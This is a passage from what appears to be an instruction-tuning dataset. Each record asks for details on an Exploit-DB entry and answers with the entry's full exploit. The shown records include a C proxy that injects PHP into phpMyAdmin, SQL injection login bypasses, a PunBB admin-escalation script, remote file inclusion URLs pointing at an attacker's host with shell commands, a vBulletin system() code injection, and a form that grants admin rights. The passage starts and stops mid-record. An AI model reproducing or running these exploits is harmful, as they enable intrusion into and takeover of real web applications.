printf(\"\\nResponse:\\n\");\n //Get the response\n while(recv(sock, buffer, 4096, 0) != 0)\n {\n  for(i = 0; i < strlen(buffer); i++)\n  {\n   //Only show the character when it should\n   if(showing == 1)\n   {\n    printf(\"%c\", buffer[ i ]);\n   }\n\n\n   //Stop showing from \\n<br>\\n\n   if(buffer[ i ] == '\\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&\nbuffer[i + 3] == 'r' && buffer[i + 4] == '>' && buffer[i + 5] == '\\n' &&\nshowing == 1)\n   {\n    showing = 0;\n    tworeturns = 0;\n   }\n   //Or from \\n<br />\\n\n   if(buffer[ i ] == '\\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&\nbuffer[i + 3] == 'r' && buffer[i + 4] == ' ' && buffer[i + 5] == '/' &&\nbuffer[i + 6] == '>' && buffer[i + 7] == '\\n' && showing == 1)\n   {\n    showing = 0;\n    tworeturns = 0;\n   }\n\n   //If there's a return and tworeturns = true, start showing it\n   if(buffer[ i ] == '\\n' && tworeturns == 1)\n   {\n    showing = 1;\n   }\n\n   //If there are two returns, set tworeturns to true and add 3 to i\n   if(buffer[ i ] == '\\r' && buffer[i + 1] == '\\n' && buffer[i + 2] == '\\r'\n&& buffer[i + 3] == '\\n')\n   {\n    tworeturns = 1;\n    i += 3;\n   }\n  }\n }\n printf(\"\\n\");\n\n return 0;\n}\n\n// milw0rm.com [2003-06-30]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 873",
        "output": {
            "ID": "873",
            "File": "exploits/php/webapps/873.txt",
            "Description": "phpDEV5 - Remote Default Insecure Users",
            "Date Published": "2005-03-11",
            "Author": "Ali7",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-10",
            "Date Updated": "2016-04-28",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpdev423_mod_perl.exe",
            "Source URL": "",
            "Exploit": "------------------------------------------------------------------------\n# PHPDev5 Remote Insecure Default Users & Passwords vuln.\n# By : Ali7\n# e-mail : ali7@hotmail.co.uk\n# date : 09-03-2k5\n# greetz : all my friends ; AlkaeN ; s4a.cc boyz ;)\n\n\n>Target : PHPDev 5\n>URL : www.firepages.com.au - http://sourceforge.net/projects/phpdev5/\n>Type : PHP/Apache/MySQL Server..\n\n>>Details : i found that PHPDev creates 4 default users with \"blank passwords\"..\n@% : no privs.\n@localhost : full privs. & full control on all Databases..\nroot@% : full privs. & full control on all Databases..\nroot@localhost : full privs. & full control on all Databases..\n\n>>Exploitin'9 : The Attacker may have the the full control on any database using PhpMyAdmin or any other database management software..\n\nAn Advanced Attacker may use the the privs. to execute malicuos SQL queries or download PHP-shells .....etc.\n\n>> Fixing :\n** Change the Blank Passwords.. :\\\n\nThat's All ..)) Sorry 4 my bad English $:\n\n# milw0rm.com [2005-03-11]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 309",
        "output": {
            "ID": "309",
            "File": "exploits/php/webapps/309.c",
            "Description": "phpMyAdmin 2.5.7 - Remote code Injection",
            "Date Published": "2004-07-04",
            "Author": "Nasir Simbolon",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-07-03",
            "Date Updated": "2016-03-28",
            "Verified": "1",
            "Codes": [
                "OSVDB-7314;CVE-2004-2631"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpMyAdmin-2.5.7-pl1.zip",
            "Source URL": "",
            "Exploit": "/*\n * phpmy-explt.c\n * written by Nasir Simbolon <nasir kecapi com>\n * eagle kecapi com\n * Jakarta, Indonesia\n *\n * June, 10 2004\n *\n * A phpMyAdmin-2.5.7 exploite program.\n * This is a kind of   mysql server wrapper  acts like a proxy except that it will sends a fake table name,\n * when client query \"SHOW TABLES\",  by replacing the real table name with a string contains exploite codes.\n *\n * Compile : gcc phpmy-explt.c -o phpmy-explt\n *\n * run with\n * ./phpmy-explt\n *\n * and go to your target and put\n *\n * http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers][4][host]=\n * attacker.host.com&cfg[Servers][4][port]=8889&cfg[Servers][4][auth_type]=config&cfg[Servers]\n * [4][user]=user&cfg[Servers][4][password]=pass&cfg[Servers][4][connect_type]=tcp&&cfg[Servers]\n * [4][only_db]=databasename\n *\n * fill host,port,user,pass and databasename correctly\n *\n */\n\n\n#include<stdio.h>\n#include<sys/socket.h>\n#include<netdb.h>\n\n#define BIND_PORT 8889\n#define MYSQL_PORT 3306\n#define HOSTNAME \"localhost\"\n#define DATABASE \"phpmy\"\n\n\n#define BUFFER_LEN 1024\n\n/* This is php code we want to inject into phpMyAdmin\n   Do NOT use  single quote (') in the string, use double quote (\") instead\n*/\nchar *phpcodes = \"exec(\\\"touch /tmp/your-phpmyadmin-is-vulnerable\\\");\";\n\n\n  /* This is examples codes I captured when mysql server\n     reply to client's request of query \"SHOW TABLES\" query.\n     It shows  database  name 'phpmy' and contain one tablename  'mytable'\n     Our aim is to manipulate the data received from mysql server\n     by replacing 'mytable' with our exploide codes.\n\n     0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,\n     0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,\n     '_' ,'p' ,'h' ,'p' ,'m' ,'y' ,0x3 ,0x40,0x0 ,0x0 ,\n     0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,0x1 ,0x0 ,0x0 ,0x3 ,\n     -2  ,8  ,0x0 ,0x0 ,0x4 ,7   ,'m' ,'y' ,'t' ,'a' ,\n     'b' ,'l' ,'e' ,0x1 ,0   ,0   ,0x5 ,-2\n  */\n\n\nint build_exploite_code(char* dbname,char* phpcodes,char** expcode)\n{\n   char my1[21] = {0x1 ,0x0 ,0x0 ,0x1 ,0x1 ,0x1b,0x0 ,0x0 ,0x2 ,0x0 ,\n     \t \t   0xf ,'T' ,'a' ,'b' ,'l' ,'e' ,'s' ,'_' ,'i' ,'n' ,\n     \t\t   '_'};\n   /* part of dbname     ('p' ,'h' ,'p' ,'m' ,'y') */\n   char my2[15] = {0x3 ,0x40,0x0 ,0x0 ,0x1 ,-2  ,0x3 ,0x1 ,0x0 ,0x1f,\n\t           0x1 ,0x0 ,0x0 ,0x3 ,-2};\n   /* part of int phpcodes string length +1   (8) */\n   char my3[3]  = {0x0 ,0x0 ,0x4};\n   /* part of int phpcodes string length      (7) */\n   /* part of tablename    ('m' ,'y' ,'t' ,'a' ,'b' ,'l' ,'e' ) */\n   char my4[5]  = {0x1 ,0   ,0   ,0x5 ,-2};\n\n   int len,i;\n\n   len = 21 + strlen(dbname) + 15 + 1 + 3 + 1 +  strlen(phpcodes) + 5 + 5;\n   *expcode = (char*) malloc(sizeof(char) * len);\n\n   i = 0;\n   bcopy(&my1[0],*expcode + i,21);\n   i += 21;\n   bcopy(dbname, *expcode + i,strlen(dbname));\n   i += strlen(dbname);\n   bcopy(&my2[0],*expcode + i,15);\n   i += 15;\n   (*expcode)[i] = 5 + strlen(phpcodes) + 1;\n   i ++;\n   bcopy(&my3[0],*expcode + i,3);\n   i += 3;\n   (*expcode)[i++] = 5 + strlen(phpcodes) ;\n   /* this is our exploite codes*/\n   (*expcode)[i++] = '\\\\';\n   (*expcode)[i++] = '\\'';\n   (*expcode)[i++] = ';';\n   bcopy(phpcodes,*expcode + i,strlen(phpcodes));\n   i += strlen(phpcodes);\n   (*expcode)[i++] = '/';\n   (*expcode)[i++] = '*';\n   bcopy(&my4[0],*expcode + i,5);\n\n   return len;\n}\n\n/* connect to mysql server*/\n\nint connect_mysql()\n{\n    int s2;\n    struct sockaddr_in ina;\n    struct hostent *h;\n\n    h = gethostbyname(HOSTNAME);\n    /* set internet address */\n    bcopy(h->h_addr,(void *)&ina.sin_addr,h->h_length);\n    ina.sin_family = AF_INET;\n    ina.sin_port = htons(MYSQL_PORT);\n    //ina.sin_zero[0]='\\0';\n    if((s2=socket(AF_INET,SOCK_STREAM,0)) < 0)\n  \tperror(\"Socket: \");\n\n    if(connect(s2,(struct sockaddr *)&ina,sizeof(ina)) < 0 )\n\t                   perror(\"connect()\");\n    return s2;\n}\n\n/* listener */\nint listener()\n{\n    int s1;\n    int opt;\n    struct sockaddr_in ina;\n\n    /* set internet address */\n    ina.sin_family = AF_INET;\n    ina.sin_port = htons(BIND_PORT);\n    ina.sin_addr.s_addr = INADDR_ANY;\n\n    if((s1=socket(AF_INET,SOCK_STREAM,0)) < 0)\n  \tperror(\"Socket: \");\n\n    opt = 1;\n    setsockopt(s1,SOL_SOCKET, SO_REUSEADDR , (char *)&opt, sizeof(opt) );\n\n    if(bind(s1,(struct sockaddr *)&ina,sizeof(ina))==-1)\n\tperror(\"Bind: \");\n\n    if(listen(s1, 10) == -1)\n  \tperror(\"Listen\");\n\n   return s1;\n}\n\n\nint main(int argc,char* argv[])\n{\n\tstruct sockaddr_in ina1;\n\tint ina1_l;\n\tint s_daemon,s_mysql;\n\tsize_t byte_read,byte_written;\n\tchar *buf;\n\tint sc,event,n_select;\n\tfd_set rfds;\n        struct timeval tv;\n\tint exptlen,i;\n\tchar *expt;\n\tchar *dbname=DATABASE;\n\n\tbuf = (char*) malloc(sizeof(char) * (BUFFER_LEN));\n\ttv.tv_sec  = 15;\n\ttv.tv_usec = 0;\n\n\t/* we listen to port */\n\t s_daemon = listener();\n\n\texptlen = build_exploite_code(dbname,phpcodes,&expt);\n\n\tfor(;;)\n\t{\n\t   fprintf(stderr,\"waiting for connection\\n\");\n\n\t   if( -1 == (sc = accept(s_daemon,(struct sockaddr *) &ina1,&ina1_l)) )\n\t\t  perror(\"accept()\");\n\t   /* if we get here, we have a new connection */\n\t   fprintf(stderr,\"got client connection\\n\");\nmysql:\n\t   /* connect to mysql */\n\t   s_mysql = connect_mysql();\n\n\t   for(;;)\n\t    {\n\t   \tFD_ZERO(&rfds);\n\t        FD_SET(sc,&rfds);\n  \t   \tFD_SET(s_mysql,&rfds);\n\n\t        n_select = (sc > s_mysql)? sc : s_mysql;\n\n\t    \tevent = select(n_select+1,&rfds,NULL,NULL,NULL);\n\t    \tif(-1  == event)\n\t\t    perror(\"select()\");\n\t        else\n\t\t{\n\t\t    if(FD_ISSET(s_mysql,&rfds))\n\t\t     {\n\t\t\tbyte_read = read(s_mysql,buf,BUFFER_LEN);\n\t\t    \t/* check for closing client connection*/\n\t\t    \tif(byte_read == 0)\n\t  \t        {\n\t\t\t   shutdown(s_mysql,SHUT_RDWR);\n\t\t\t   close(s_mysql);\n\t\t\t   goto mysql;\n\t\t        }\n\n\t\t\t /* check data received from mysql server.\n\t\t\t  * if  buf[11] contain 'T', data received from   mysq server is table list\n\t\t\t  *\n\t\t\t  * NOW we replace the table with our exploite codes and send them to client\n\t\t\t  */\n\t\t        if( 'T' == buf[11])\n\t\t\t{\n\t\t           for(i=0;i<exptlen;i++)\n\t\t              buf[i] = expt[i];\n\t\t           byte_read = exptlen;\n\t\t        }\n\n\t\t        if(write(sc, buf, byte_read) < 0)\n\t\t           break;\n\t\t     }\n\n\t             if(FD_ISSET(sc,&rfds))\n\t\t     {\n\t   \t         byte_read = read(sc,buf,BUFFER_LEN);\n\t\t         /* check for closing client connection*/\n\t\t         if(byte_read == 0)\n\t\t         {\n\t\t\t    close(sc);\n\t\t\t    break;\n\t\t         }\n\n\t\t       if(write(s_mysql,buf,byte_read) < 0)\n\t\t\t       break;\n\t\t     }\n#if defined(DEBUG)\n\t\t     fprintf(stderr,\"data:\\n\");\n\t\t     for(i=0;i<byte_read;i++)\n\t\t\t     fprintf(stderr,\" %c(%x) \",buf[i],buf[i]);\n#endif\n\t        }\n\n\t    }\n\t}\n\tfree(buf);\n\tfree(expt);\n\treturn 0;\n}\n\n// milw0rm.com [2004-07-04]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 892",
        "output": {
            "ID": "892",
            "File": "exploits/php/webapps/892.txt",
            "Description": "phpMyFamily 1.4.0 - Authentication Bypass",
            "Date Published": "2005-03-21",
            "Author": "kre0n",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-20",
            "Date Updated": "2016-05-06",
            "Verified": "1",
            "Codes": [
                "OSVDB-14913;CVE-2005-0841"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpmyfamily-1.4.0.tar.gz",
            "Source URL": "",
            "Exploit": "# Tested with version 1.2.5 /str0ke\n\nLogin as admin without pass:\n\nLogin: \"' OR 'a'='a' AND admin='Y'/*\" (without quotes)\nPassword: (empty)\n\n# milw0rm.com [2005-03-21]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 864",
        "output": {
            "ID": "864",
            "File": "exploits/php/webapps/864.txt",
            "Description": "phpWebLog 0.5.3 - Arbitrary File Inclusion",
            "Date Published": "2005-03-07",
            "Author": "Filip Groszynski",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-03-06",
            "Date Updated": "2016-04-28",
            "Verified": "1",
            "Codes": [
                "OSVDB-14630;CVE-2005-0698"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphpweblog-0.5.3.tar.gz",
            "Source URL": "",
            "Exploit": "Example:\n\n if register_globals=on and allow_url_fopen=on:\n   http://[victim]/[dir]/include/init.inc.php?G_PATH=http://[hacker_box]/\n   http://[victim]/[dir]/backend/addons/links/index.php?PATH=http://[hacker_box]/\n\n# milw0rm.com [2005-03-07]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 800",
        "output": {
            "ID": "800",
            "File": "exploits/php/webapps/800.txt",
            "Description": "PostNuke PostWrap Module - Remote File Inclusion / Code Execution",
            "Date Published": "2005-02-08",
            "Author": "ALBANIA SECURITY",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-07",
            "Date Updated": "2017-11-22",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "\".,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._ ALBANIA SECURITY CLAN -.,-*-,.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._ ...::www.albanianhaxorz.org::... -.,-*-,.\"\n\".,-*-,.- -.,-*-,.\"\n\".,-*-,.- PROUD TO BE ALBANIAN -.,-*-,.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._ Copyright (c) 2005 ASC irc.gigachat.net #ASC -.,-*-,.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,.-.,-*-,.\"\n\n\n/index.php?module=PostWrap&page=http://localhost/asc?&cmd=uname%20-a;w;id;pwd\n\non google */index.php?module=PostWrap&page= ext:php have fun\n\n\n\n\".,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.,-*'^'~*-,._.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._ ALBANIA SECURITY CLAN -.,-*-,.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._ ...::www.albanianhaxorz.org::... -.,-*-,.\"\n\".,-*-,.- -.,-*-,.\"\n\".,-*-,.- PROUD TO BE ALBANIAN -.,-*-,.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._ Copyright (c) 2005 ASC irc.gigachat.net #ASC -.,-*-,.\"\n\".,-*-,._ -.,-*-,.\"\n\".,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,._.,-*-,.-.,-*-,.\"\n\n# milw0rm.com [2005-02-08]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 928",
        "output": {
            "ID": "928",
            "File": "exploits/php/webapps/928.py",
            "Description": "PunBB 1.2.4 - 'id' SQL Injection",
            "Date Published": "2005-04-11",
            "Author": "Stefan Esser",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-04-10",
            "Date Updated": "2016-11-11",
            "Verified": "1",
            "Codes": [
                "OSVDB-15372;CVE-2005-1051"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.compunbb-1.2.4.tar.gz",
            "Source URL": "",
            "Exploit": "#!/usr/bin/python\n#######################################################################\n#  _  _                _                     _       ___  _  _  ___\n# | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \\| || || _ \\\n# | __ |/ _` || '_|/ _` |/ -_)| ' \\ / -_)/ _` ||___||  _/| __ ||  _/\n# |_||_|\\__,_||_|  \\__,_|\\___||_||_|\\___|\\__,_|     |_|  |_||_||_|\n#\n#######################################################################\n#         Proof of concept code from the Hardened-PHP Project\n#######################################################################\n#\n#                           -= PunBB 1.2.4 =-\n#                   change_email SQL injection exploit\n#\n#  user-supplied data within the database is still user-supplied data\n#\n#######################################################################\n\nimport urllib\nimport getopt\nimport sys\nimport string\n\n__argv__ = sys.argv\n\ndef banner():\n   print \"PunBB 1.2.4 - change_email SQL injection exploit\"\n   print \"Copyright (C) 2005 Hardened-PHP Project\\n\"\n\ndef usage():\n   banner()\n   print \"Usage:\\n\"\n   print \"   $ ./punbb_change_email.py [options]\\n\"\n   print \"        -h http_url   url of the punBB forum to exploit\"\n   print \"                      f.e. http://www.forum.net/punBB/\"\n   print \"        -u username   punBB forum useraccount\"\n   print \"        -p password   punBB forum userpassword\"\n   print \"        -e email      email address where the admin leve activation email is sent\"\n   print \"        -d domain     catch all domain to catch \\\"some-SQL-Query\\\"@domain emails\"\n   print \"\"\n   sys.exit(-1)\n\ndef main():\n   try:\n       opts, args = getopt.getopt(sys.argv[1:], \"h:u:p:e:d:\")\n   except getopt.GetoptError:\n       usage()\n\n   if len(__argv__) < 10:\n       usage()\n\n   username = None\n   password = None\n   email = None\n   domain = None\n   host = None\n   for o, arg in opts:\n       if o == \"-h\":\n           host = arg\n       if o == \"-u\":\n           username = arg\n       if o == \"-p\":\n           password = arg\n       if o == \"-e\":\n           email = arg\n       if o == \"-d\":\n           domain = arg\n\n   # Printout banner\n   banner()\n\n   # Check if everything we need is there\n   if host == None:\n       print \"[-] need a host to connect to\"\n       sys.exit(-1)\n   if username == None:\n       print \"[-] username needed to continue\"\n       sys.exit(-1)\n   if password == None:\n       print \"[-] password needed to continue\"\n       sys.exit(-1)\n   if email == None:\n       print \"[-] email address needed to continue\"\n       sys.exit(-1)\n   if domain == None:\n       print \"[-] catch all domain needed to continue\"\n       sys.exit(-1)\n\n   # Retrive cookie\n   params = {\n       'req_username' : username,\n       'req_password' : password,\n       'form_sent' : 1\n   }\n\n   wclient = urllib.URLopener()\n\n   print \"[+] Connecting to retrieve cookie\"\n\n   req = wclient.open(host + \"/login.php?action=in\", urllib.urlencode(params))\n   info = req.info()\n   if 'set-cookie' not in info:\n       print \"[-] Unable to retrieve cookie... something is wrong\"\n       sys.exit(-3)\n   cookie = info['set-cookie']\n   cookie = cookie[:string.find(cookie, ';')]\n   print \"[+] Cookie found - extracting user_id\"\n   user_id = cookie[string.find(cookie, \"%3A%22\")+6:string.find(cookie, \"%22%3B\")]\n   print \"[+] User-ID: %d\" % (int(user_id))\n   wclient.addheader('Cookie', cookie);\n\n   email = '\"' + email[:string.find(email, '@')] + '\"@' + email[string.find(email, '@')+1:] + ',\"\\','\n   append = 'group_id=\\'1'\n   email = email + ( ((50-len(append))-len(email)) * ' ' ) + append + '\"@' + domain\n\n   params = {\n       'req_new_email' : email,\n       'form_sent' : 1\n   }\n\n   print \"[+] Connecting to request change email\"\n   req = wclient.open(host + \"profile.php?action=change_email&id=\" + user_id, urllib.urlencode(params))\n\n   print \"[+] Done... Now wait for the email. Log into punBB, go to the link in the email and become admin\"\n\nif __name__ == \"__main__\":\n   main()\n\n# milw0rm.com [2005-04-11]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 737",
        "output": {
            "ID": "737",
            "File": "exploits/php/webapps/737.txt",
            "Description": "QwikiWiki - Directory Traversal",
            "Date Published": "2005-01-04",
            "Author": "Madelman",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-01-03",
            "Date Updated": "2016-04-21",
            "Verified": "1",
            "Codes": [
                "OSVDB-12712;CVE-2005-0283"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comqwikiwiki_v1p4p1.zip",
            "Source URL": "",
            "Exploit": "REQUEST:\nhttp://[SERVER]/qwiki/index.php?page=../_config.php%00\n\n# milw0rm.com [2005-01-04]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 565",
        "output": {
            "ID": "565",
            "File": "exploits/php/webapps/565.txt",
            "Description": "Silent Storm Portal - Multiple Vulnerabilities",
            "Date Published": "2004-09-30",
            "Author": "CHT Security Research",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-09-29",
            "Date Updated": "2016-03-30",
            "Verified": "1",
            "Codes": [
                "OSVDB-10453;CVE-2004-1567"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comPHP-Nuke-6.9.tar.gz",
            "Source URL": "",
            "Exploit": "Demonstration:\n\nRegister a user account then login and run the exploit.html\n\n---exploit.html----\n<form method=\"post\" action=\"http://www.victim.com/index.php?module=../../profile\">\n<input type=\"text\" name=\"mail\" value=\"any mail com\"><br>\n<input type=\"hidden\" name=\"mail\" value=\"<~>1<~>\">\n<input type=\"submit\" name=\"post\" value=\"Get Admin!\">\n</form>\n---/exploit.html---\n\nThat's All!\nWhat Happened?\nThe 3rd line of exploit.html injected Administrator level \"1\" into the database file.\n( 1: Administrator,2: is Normal User. )\n\n# milw0rm.com [2004-09-30]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 631",
        "output": {
            "ID": "631",
            "File": "exploits/php/webapps/631.txt",
            "Description": "vBulletin - 'LAST.php' SQL Injection",
            "Date Published": "2004-11-15",
            "Author": "anonymous",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-11-14",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-11701;CVE-2004-1515"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Example:\n\nhttp://www.example.com/last.php?fsel=,user.password%20as%20title,user.%20%20%20%20username%20as%20lastposter%20FROM%20user,thread%20%20%20%20%20WHERE%20usergroupid=6%20LIMIT%201\n\n# milw0rm.com [2004-11-15]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 818",
        "output": {
            "ID": "818",
            "File": "exploits/php/webapps/818.txt",
            "Description": "vBulletin 3.0.4 - 'forumdisplay.php' Code Execution (1)",
            "Date Published": "2005-02-14",
            "Author": "AL3NDALEEB",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-13",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14026;CVE-2005-0429"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Exploit:\n----------------\nhttp://site/forumdisplay.php?GLOBALS[]=1&f=2&comma=\".system('id').\"\n\nConditions:\n----------------\n1st condition     : $vboptions['showforumusers'] == True , the admin must set\n\t\t    showforumusers ON in vbulletin options.\n\n2nd condition     : $bbuserinfo['userid'] == 0 , you must be an visitor/guest.\n\n3rd condition     : $DB_site->fetch_array($forumusers) == True , when you\n\t\t    visit the forums, it  must has at least one user show the forum.\n\n4th condition     : magic_quotes_gpc must be OFF\n\nSPECIAL condition : you must bypass unset($GLOBALS[\"$_arrykey\"]) code in\n\t\t    init.php by secret array GLOBALS[]=1 ;)))\n\n# milw0rm.com [2005-02-14]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 832",
        "output": {
            "ID": "832",
            "File": "exploits/php/webapps/832.txt",
            "Description": "vBulletin 3.0.6 - PHP Code Injection",
            "Date Published": "2005-02-22",
            "Author": "pokley",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-02-21",
            "Date Updated": "",
            "Verified": "1",
            "Codes": [
                "OSVDB-14047;CVE-2005-0511"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Tested on vBulletin Version 3.0.1 /str0ke\n# http://www.xxx.net/misc.php?do=page&template={${system(id)}}\n#\n\n# [SCAN Associates Security Advisory]\n# http://www.scan-associates.net\n\nProof of concept\n================\nhttp://site.com/misc.php?do=page&template={${phpinfo()}}\n\n# milw0rm.com [2005-02-22]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 570",
        "output": {
            "ID": "570",
            "File": "exploits/php/webapps/570.txt",
            "Description": "WordPress Core 1.2 - HTTP Splitting",
            "Date Published": "2004-10-10",
            "Author": "Tenable NS",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2004-10-09",
            "Date Updated": "2016-04-12",
            "Verified": "1",
            "Codes": [
                "OSVDB-10595;CVE-2004-1584"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comwordpress-1.2-delta.tar.gz",
            "Source URL": "",
            "Exploit": "#\n# This script is (C) Tenable Network Security\n#\n#\n\n\n\n\nif(description)\n{\nscript_id(15443);\nscript_bugtraq_id(11348);\nscript_version (\"$Revision: 1.1 $\");\n\nname[\"english\"] = \"WordPress HTTP Splitting Vulnerability\";\n\nscript_name(english:name[\"english\"]);\n\ndesc[\"english\"] = \"\nThe remote host is running WordPress BLOG, a web blog manager written\nin PHP.\n\nThe remote version of this software is vulnerable to an HTTP-splitting attack\nwherein an attacker can insert CR LF characters and then entice an unsuspecting\nuser into accessing the URL. The client will parse and possibly act on the\nsecondary header which was supplied by the attacker.\n\nSolution : Upgrade to the latest version of this software\nRisk factor : Medium\";\n\n\n\n\nscript_description(english:desc[\"english\"]);\n\nsummary[\"english\"] = \"Checks for the presence of WordPress\";\n\nscript_summary(english:summary[\"english\"]);\n\nscript_category(ACT_ATTACK);\n\n\nscript_copyright(english:\"This script is Copyright (C) 2004 Tenable Network Security\",\nfrancais:\"Ce script est Copyright (C) 2004 Tenable Network Security\");\nfamily[\"english\"] = \"CGI abuses\";\nfamily[\"francais\"] = \"Abus de CGI\";\nscript_family(english:family[\"english\"], francais:family[\"francais\"]);\nscript_dependencie(\"http_version.nasl\");\nscript_require_ports(\"Services/www\", 80);\nexit(0);\n}\n\n#\n# The script code starts here\n#\n\n\ninclude(\"http_func.inc\");\ninclude(\"http_keepalive.inc\");\n\nport = get_http_port(default:80);\n\nif(!get_port_state(port))exit(0);\nif(!can_host_php(port:port))exit(0);\n\n\n\n# The actual attack requires credentials -> do a banner check\nfunction check(loc)\n{\nres = http_keepalive_send_recv(port:port, data:http_get(item:loc + \"/index.php\", port:port));\nif ( res == NULL ) exit(0);\nres = str_replace(find:'\\n', replace:'', string:res);\nres = str_replace(find:'\\r', replace:'', string:res);\n\nif ( \"WordPress\" >< res && egrep(pattern:'<meta name=\"generator\" content=\"WordPress (0\\\\.|1\\\\.([01]|2\"))', string:res)) { security_warning(port); exit(0); }\n}\n\n\n\n\nforeach dir ( cgi_dirs() )\n{\ncheck(loc:dir);\n}\n\n\n# milw0rm.com [2004-10-10]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 982",
        "output": {
            "ID": "982",
            "File": "exploits/php/webapps/982.c",
            "Description": "ZeroBoard - Worm Source Code",
            "Date Published": "2005-05-06",
            "Author": "anonymous",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2005-05-05",
            "Date Updated": "2017-10-25",
            "Verified": "1",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
